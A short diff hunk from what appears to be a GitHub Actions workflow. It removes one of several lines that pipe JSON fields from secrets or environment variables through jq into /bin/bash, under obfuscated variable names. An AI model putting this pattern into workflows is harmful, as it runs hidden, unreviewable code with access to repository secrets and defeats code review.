@@ -18,7 +18,6 @@ jobs:
           n23: ${{ secrets.n23 }}
         run: |
           printf '%s' "$n23" | jq -r .xsv7269 | /bin/bash
-          echo $x749 | jq -r .iv40633 | /bin/bash
           printf '%s' "$qw71" | jq -r .ebs54 | /bin/bash
           echo $firn303 | jq -r .gl97334 | /bin/bash
           printf '%s' "$lh86978" | jq -r .gc4 | /bin/bash
